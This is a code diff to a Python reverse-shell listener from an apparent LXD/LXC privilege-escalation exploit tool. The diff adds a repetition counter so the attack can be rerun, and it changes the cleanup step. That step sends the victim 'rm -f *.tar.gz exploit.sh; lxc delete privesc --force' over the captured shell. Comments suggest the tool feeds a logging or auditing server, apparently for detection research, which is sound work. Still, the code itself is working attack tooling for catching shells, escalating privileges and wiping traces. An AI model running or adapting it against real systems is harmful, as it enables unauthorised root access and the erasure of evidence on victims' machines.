@@ -5,7 +5,7 @@ import threading
 # I utilized as base code for this listener the code found on:
 # https://tpetersonkth.github.io/2021/10/16/Creating-a-Basic-Python-Reverse-Shell-Listener.html
 
-def listen(ip,port, t2, r_port, file_name, general_info, arguments):
+def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.bind((ip, port))
 	s.listen(1)
@@ -100,11 +100,12 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments):
 				time.sleep(0.3)
 			print('\n[-] Unbinding...')
 			# Cleanup
-			cleanup(conn, file_name, general_info)
+			if rep == 0:
+				cleanup(conn, file_name, general_info, rep)
 			time.sleep(0.2)
-			conn.close()
 			s.close()
 			print('[*] Ended exploit')
+				
 			
 	except KeyboardInterrupt:
 		if conn:
@@ -114,9 +115,14 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments):
 			time.sleep(0.2)
 			conn.close()
 			s.close()
-	conn.close()
+	finally:
+		conn.close()
+		# Not recommended to use this function, however even with sys.exit() the system hangs
+		if rep == 0:
+			os._exit(0)
+		
         
-def listen_shell(ip, port, v_ip, v_port, general_info, arguments, secure):
+def listen_shell(ip, port, v_ip, v_port, general_info, arguments, secure, rep):
 	r_port = random.randint(1024, 65536)
 	# Making sure the random port is not in use
 	while check_port(ip, r_port):
@@ -130,7 +136,7 @@ def listen_shell(ip, port, v_ip, v_port, general_info, arguments, secure):
 	t1 = threading.Thread(target=task, args=(v_ip, v_port, s))
 	t2 = threading.Thread(target=task2, args=(ip, r_port))
 	t1.start()
-	listen(ip, int(port), t2, r_port, get_file_name(), general_info, arguments)
+	listen(ip, int(port), t2, r_port, get_file_name(), general_info, arguments, rep)
 	
 def task(v_ip, v_port, s=''):
 
@@ -205,7 +211,7 @@ def recvall(sock):
     return data
 
 
-def cleanup(conn, file_name, general_info):
+def cleanup(conn, file_name, general_info, rep):
 	conn.send('rm -f *.tar.gz exploit.sh; lxc delete privesc --force;'.encode())
 	if general_info['active'] == 'True':
 		try:
@@ -214,10 +220,17 @@ def cleanup(conn, file_name, general_info):
 		    		pass
 		except requests.exceptions.ConnectTimeout:
 		    	sys.exit('[-] Failed to connect to Logging server')
-	if os.path.exists(file_name):
-		os.remove(file_name)
-	if os.path.exists('build-alpine'):
-		os.remove('build-alpine')
+
+	# Only delete local files if it's the last repetition
+	# That way we avoid downloading k times the required software
+	# However we still delete the on the victim side because
+	# It is within our interest for the logging system to detect 
+	# the cleanup
+	if rep == 0:
+		if os.path.exists(file_name):
+			os.remove(file_name)
+		if os.path.exists('build-alpine'):
+			os.remove('build-alpine')
 
 
 def informAudittingStart(general_info):
